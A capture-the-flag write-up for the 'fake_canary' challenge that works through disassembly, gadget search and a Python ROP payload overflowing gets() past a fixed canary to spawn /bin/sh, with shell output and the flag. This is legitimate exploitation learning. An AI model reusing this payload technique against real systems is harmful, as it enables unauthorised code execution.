# FAKE_CANARY
```
Description
Here at Stack Smasher Inc, we protect all our stacks with industry grade canaries!

Attachments
https://2021.imaginaryctf.org/r/fake_canary nc chal.imaginaryctf.org 42002
```

- File : [fake_canary](../attachements/fake_canary/fake_canary)

Here we have to obtain a shell through **fake_canary** via ncat

Looking at the binary we can see a static canary : **0xdeadbeef**
```
┌ 158: main ();
│           ; var int64_t var_30h @ rbp-0x30
│           ; var uint32_t var_8h @ rbp-0x8
│           0x00400687      55             push rbp
│           0x00400688      4889e5         mov rbp, rsp
│           0x0040068b      4883ec30       sub rsp, 0x30
│           0x0040068f      488b05ba0920.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x601050:8]=0
│           0x00400696      b900000000     mov ecx, 0
│           0x0040069b      ba02000000     mov edx, 2
│           0x004006a0      be00000000     mov esi, 0
│           0x004006a5      4889c7         mov rdi, rax
│           0x004006a8      e8d3feffff     call sym.imp.setvbuf
│           0x004006ad      488b05ac0920.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601060:8]=0
│           0x004006b4      b900000000     mov ecx, 0
│           0x004006b9      ba02000000     mov edx, 2
│           0x004006be      be00000000     mov esi, 0
│           0x004006c3      4889c7         mov rdi, rax
│           0x004006c6      e8b5feffff     call sym.imp.setvbuf
│           0x004006cb      b8efbeadde     mov eax, 0xdeadbeef
│           0x004006d0      488945f8       mov qword [var_8h], rax
│           0x004006d4      488d3ded0000.  lea rdi, str.Welcome_to_Stack_Smasher_ ; 0x4007c8 ; "Welcome to Stack Smasher!"
│           0x004006db      e870feffff     call sym.imp.puts
│           0x004006e0      488d3dfb0000.  lea rdi, str.Whats_your_name_ ; 0x4007e2 ; "What's your name?"
│           0x004006e7      e864feffff     call sym.imp.puts
│           0x004006ec      488d45d0       lea rax, [var_30h]
│           0x004006f0      4889c7         mov rdi, rax
│           0x004006f3      b800000000     mov eax, 0
│           0x004006f8      e873feffff     call sym.imp.gets
│           0x004006fd      b8efbeadde     mov eax, 0xdeadbeef
│           0x00400702      483945f8       cmp qword [var_8h], rax
│       ┌─< 0x00400706      7416           je 0x40071e
│       │   0x00400708      488d3de90000.  lea rdi, str.HACKER_DETECTED__Program_aborted ; 0x4007f8 ; "**HACKER DETECTED! Program aborted**"
│       │   0x0040070f      e83cfeffff     call sym.imp.puts
│       │   0x00400714      bfffffffff     mov edi, 0xffffffff         ; -1
│       │   0x00400719      e872feffff     call sym.imp.exit
│       │   ; CODE XREF from main @ 0x400706
│       └─> 0x0040071e      b800000000     mov eax, 0
│           0x00400723      c9             leave
└           0x00400724      c3             ret
```

We need to place **0xdeadbeef** in **var_8h @ rbp-0x8**

Analyzing the stack with gdb we see that we need a **0x28** padding then **0xdeadbeef**

Then we need to redirect the code execution to **system('/bin/sh')**

## Finding system
Gladly **system** is in the .plt section
```
$ objdump -d fake_canary
[...]
0000000000400560 <system@plt>:
  400560:    ff 25 ba 0a 20 00        jmp    *0x200aba(%rip)        # 601020 <system@GLIBC_2.2.5>
  400566:    68 01 00 00 00           push   $0x1
  40056b:    e9 d0 ff ff ff           jmp    400540 <.plt>
[...]
```

## Finding '/bin/sh'
"/bin/sh/" is also in the binary :
```
$ strings -a -t x fake_canary | grep "/bin/sh"
    81d /bin/sh
```

And the binary start at 0x400000
```
gdb> vmmap
Start              End                Perm    Name
0x00400000         0x00401000         r-xp    /home/max/projet/ctf/imaginaryctf/fake_canary/fake_canary
0x00600000         0x00601000         r--p    /home/max/projet/ctf/imaginaryctf/fake_canary/fake_canary
0x00601000         0x00602000         rw-p    /home/max/projet/ctf/imaginaryctf/fake_canary/fake_canary
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    mapped
0x00007ffff7dd3000 0x00007ffff7df9000 r--p    /usr/lib/libc-2.33.so
0x00007ffff7df9000 0x00007ffff7f44000 r-xp    /usr/lib/libc-2.33.so
0x00007ffff7f44000 0x00007ffff7f90000 r--p    /usr/lib/libc-2.33.so
0x00007ffff7f90000 0x00007ffff7f93000 r--p    /usr/lib/libc-2.33.so
0x00007ffff7f93000 0x00007ffff7f96000 rw-p    /usr/lib/libc-2.33.so
0x00007ffff7f96000 0x00007ffff7fa1000 rw-p    mapped
0x00007ffff7fc7000 0x00007ffff7fcb000 r--p    [vvar]
0x00007ffff7fcb000 0x00007ffff7fcd000 r-xp    [vdso]
0x00007ffff7fcd000 0x00007ffff7fce000 r--p    /usr/lib/ld-2.33.so
0x00007ffff7fce000 0x00007ffff7ff2000 r-xp    /usr/lib/ld-2.33.so
0x00007ffff7ff2000 0x00007ffff7ffb000 r--p    /usr/lib/ld-2.33.so
0x00007ffff7ffb000 0x00007ffff7ffd000 r--p    /usr/lib/ld-2.33.so
0x00007ffff7ffd000 0x00007ffff7fff000 rw-p    /usr/lib/ld-2.33.so
0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]
0xffffffffff600000 0xffffffffff601000 --xp    [vsyscall]
```

So "/bin/sh" is at **0x40081d**

One last thing is to find a ROP gadget to put **"/bin/sh"** in rdi before calling **system**

```
$ ropper --file fake_canary --search "% rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: fake_canary
0x00000000004007a3: pop rdi; ret;
```

Perfect **pop rdi** then **ret** is exactly what we are looking for.

Now the payload will look like :
```
[ 0x28 padding ] [ canary ] [ 0x8 padding ] [ ROP ] [ /bin/sh ] [ puts ] [ ROP ] [ bin/sh ] [ system ]
```

I have added `[ ROP ] [ /bin/sh ] [ puts ]` for debug to print **"bin/sh"** before executing system

Here the python script generating the payload

- File : [exploit.py](../attachements/fake_canary/exploit.py)
Executing the exploit :
```python
import struct

canary = 0xdeadbeef
system = 0x400560 
puts = 0x400550 
rop = 0x4007a3
binsh = 0x40081d

payload = 'A'*0x28
payload += struct.pack('Q',canary)
payload += 'OSEF'*2
payload += struct.pack('Q',rop)
payload += struct.pack('Q',binsh)
payload += struct.pack('Q',puts)
payload += struct.pack('Q',rop)
payload += struct.pack('Q',binsh)
payload += struct.pack('Q',system)

print(payload)
```

```
$ ( python2 exploit.py ; cat ) | ncat chal.imaginaryctf.org 42002
What's your name?
/bin/sh
id
uid=1000 gid=1000 groups=1000
ls
flag.txt
run
cat flag.txt
ictf{m4ke_y0ur_canaries_r4ndom_f492b211}
```

flag : `ictf{m4ke_y0ur_canaries_r4ndom_f492b211}`

